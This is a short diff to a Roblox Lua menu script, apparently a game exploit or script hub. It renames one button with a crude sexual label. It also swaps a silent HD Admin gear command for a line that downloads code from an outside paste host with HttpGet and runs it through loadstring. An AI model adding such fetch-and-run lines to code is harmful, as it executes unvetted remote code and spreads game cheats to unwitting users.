@@ -16446,15 +16446,11 @@ button.Size = UDim2.new(0.5,-3,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "xBow"
+button.Text = "Dick Sword"
 button.TextColor3 = whit
 button.TextWrapped = true
 button.MouseButton1Down:connect(function()
-	local ReplicatedStorage = game:GetService("ReplicatedStorage")
-	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
-
-	RequestCommand:InvokeServer(";gear me 2136389582")
-
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/fqSw26Rp69Pdax1b/raw",true))()
 end)
 
 local button = Instance.new("TextButton")
